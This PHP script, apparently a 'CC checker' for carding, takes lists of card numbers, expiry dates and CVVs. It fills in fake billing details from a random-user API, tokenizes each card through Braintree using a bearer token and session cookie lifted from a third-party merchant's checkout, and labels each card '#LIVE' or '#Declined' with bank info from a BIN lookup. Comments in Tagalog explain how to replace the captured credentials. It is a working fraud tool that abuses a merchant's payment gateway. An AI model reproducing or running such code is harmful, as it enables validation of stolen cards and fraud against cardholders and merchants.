<?php 

////[Raw Api Bigcommerce Payment Gateway]///


error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
/*
function rebootproxy(){
    $proxy = file("proxy.txt");
    $myproxy = rand(0, sizeof($proxy)-1);
    $proxy = $proxy[$myproxy];
    return $proxy;

}
$proxy = rebootproxy();
*/
$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":"', '"');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 


/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?results=5&callback=randomuserdata');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

////////////////////////////////////////////
/*
$username = 'kgjlzksr-rotate';
$password = 'w5i4ks8w8ax5';
$port = '80';
//$session = mt_rand();
$super_proxy = 'p.webshare.io';
*/
////////////////////////////////////////////
$randzip =rand(90001,96162);
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);    //UNG sa babang line kita mo ung sessionId , need mo palitan kuhain mo ung request dun sa graphql andun ung session ID
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"3792ed9e-f6d0-4cb1-8968-5fcede71f91e"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"'.$randzip.'"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$headers = array();
$headers[] = 'accept: */*';
$headers[] = 'accept-encoding: gzip, deflate, br';
$headers[] = 'accept-language: en-US,en;q=0.9'; //UNG sa babang line kita mo ung Bearer palitan mo din yan asa request header din yan(g na)
$headers[] = 'authorization: Bearer Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MDY0ODQwMzQsImp0aSI6Ijc2YWQ4NGY1LTE5ZjgtNDEzNS04ZDNkLWQ0NjIxNWE2ODI1ZCIsInN1YiI6InB2ejdwenN6NndqamtmdmciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InB2ejdwenN6NndqamtmdmciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IkVjb0RvZ3NBbmRDYXRzX2luc3RhbnQifX0.1tHMVhZEQhuHE4W7v5BwlH0TYkUhtHiwENkrS0sBX7tA7v_jhLkz9Mzs7bjfoj9mkq325AuL3FEA3ReS9Djblw';
$headers[] = 'braintree-version: 2018-05-10';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://costestimator.com';
$headers[] = 'referer: https://costestimator.com/app/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'same-origin';
$headers[] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
  "<br>";
$token = trim(strip_tags(getStr($result,'"token":"','"')));
  "<br>";

////////////////////////////////////////////

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br'); 
                                                                                            //UNG sa babang line kita mo 92664316 papalitan mo yan base sa number ng asa HEADER mo (g na)
curl_setopt($ch, CURLOPT_URL, "https://costestimator.com/api/braintree/$token");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_POSTFIELDS, '{"customer":{"customer_group":{"name":"Guest"},"geo_ip_country_code":"PH","session_token":"6440b7c142eb93e099e9f268af1e11e1b0b6b653"},"notify_url":"https://internalapi-999628744.mybigcommerce.com/internalapi/v1/checkout/order/'.$orderid.'/payment","order":{"billing_address":{"city":"'.$city.'","country_code":"US","country":"United States","first_name":"'.$firstname.'","last_name":"'.$lastname.'","phone":"'.$phone.'","state_code":"'.$state.'","state":"'.$state.'","street_1":"'.$street.'","zip":"'.$zip.'","email":"'.$email.'"},"coupons":[],"currency":"USD","id":"'.$orderid.'","items":[{"code":"95179a2a-4e7f-4f7f-8164-66a3d51ff1dc","variant_id":82,"name":" Calotren Buy 4 Get 4 Free","price":27980,"unit_price":27980,"quantity":1,"sku":"ZCA610"}],"shipping":[{"method":"USPS Priority Mail 2-3 Day"}],"shipping_address":{"city":"'.$city.'","country_code":"US","country":"United States","first_name":"'.$firstname.'","last_name":"'.$lastname.'","phone":"'.$phone.'","state_code":"'.$state.'","state":"'.$state.'","street_1":"'.$street.'","zip":"'.$zip.'"},"token":"'.$ordertoken.'","totals":{"grand_total":30709,"handling":0,"shipping":0,"subtotal":27980,"tax":2729}},"payment":{"device_info":"{\"device_session_id\":\"84877851e54b03fad1ed69cce2d0ad21\",\"fraud_merchant_id\":null}","gateway":"braintree","notify_url":"https://internalapi-999628744.mybigcommerce.com/internalapi/v1/checkout/order/'.$orderid.'/payment","method":"credit-card","credit_card_token":{"token":"'.$chargetoken.'"}},"store":{"hash":"l4rk7cmgr8","id":"999628744","name":"Calotren"}}'); 
$headers = array();
$headers[] = 'accept: */*';
//$headers[] = 'accept-encoding: gzip, deflate, br';
$headers[] = 'accept-language: en-US,en;q=0.9';   //Ung cookie papalitan mo din kuhain mo ung asa request header (goods na)
$headers[] = 'cookie: connect.sid=s%3AiZ41ICXn55p3CkPbxXGkUzYzVJzlmhkl.ajd4J29SGiYAc6xDNiZi0fCpGaEBRfqObfm6DkqeqPM';
$headers[] = 'referer: https://costestimator.com/app/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Mobile Safari/537.36';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$data = json_decode($result);
$msg = $data->msg;
//echo "<h1>".$message = trim(strip_tags(getStr($result,'"msg":"')))."</h1>";
//$avs = trim(strip_tags(getStr($result,'"avs_result":{"code":"','",')));
//$error = trim(strip_tags(getStr($result,'"errors":[{"code":"','",')));


  
#------------------------------------------#

$cctwo = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
	$type = 'Credit';
} else {
	$type = 'Debit';
}

////////////////////////////////////////////




//////////////////////////////////////////

if(strpos($result,'"success"')) {
echo "<font size=3 color='dark'><font class='badge badge-success'>#LIVE</i></font> <font class='badge badge-success'> $cc|$mes|$ano|$cvv </font> <font size=3 color='green'><font class='badge badge-success'>[ CVV - MATCHED ]</i></font> <font class='badge badge-warning'>Batang</i></font> <font class='badge badge-primary'>[Info: $bank ($country) - $type]</i></font><br>";
}
else {
   echo "<font size=3 color='dark'><font class='badge badge-danger'>#Declined</i></font> <font class='badge badge-danger'> $cc|$mes|$ano|$cvv </i></font> <font size=3 color='red'><font class='badge badge-warning'>[ DECLINED ]</i></font> <font class='badge badge-dark'>Batang</i></font> <font class='badge badge-primary'>[Message : $msg]</i></font><br>";
} 

curl_close($ch);
ob_flush();

///////Edited and modified by Kapslak///////

//echo $result

?>


